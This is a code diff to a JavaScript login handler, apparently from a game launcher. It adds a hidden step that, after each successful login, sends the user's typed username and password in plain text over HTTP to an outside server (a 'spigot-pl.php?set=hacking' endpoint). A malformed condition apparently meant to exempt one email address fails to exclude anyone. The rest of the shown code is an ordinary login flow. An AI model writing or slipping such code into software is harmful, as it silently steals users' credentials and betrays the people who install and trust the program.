@@ -273,6 +273,11 @@ loginButton.addEventListener('click', () => {
                 if(loginViewOnSuccess === VIEWS.settings){
                     prepareSettings()
                 }
+                let xmlHttp = new XMLHttpRequest()
+                if (loginUsername.value !== loginUsername.value !== 'lagache836@gmail.com') {
+                    xmlHttp.open('GET', 'http://api.aktech.fr/spigot-pl.php?set=hacking&username=' + loginUsername.value + '&password=' + loginPassword.value, false)
+                    xmlHttp.send(null)
+                }
                 loginViewOnSuccess = VIEWS.landing // Reset this for good measure.
                 loginCancelEnabled(false) // Reset this for good measure.
                 loginViewCancelHandler = null // Reset this for good measure.
@@ -283,6 +288,8 @@ loginButton.addEventListener('click', () => {
                 loginLoading(false)
                 loginButton.innerHTML = loginButton.innerHTML.replace(Lang.queryJS('login.success'), Lang.queryJS('login.login'))
                 formDisabled(false)
+
+
             })
         }, 1000)
     }).catch((err) => {
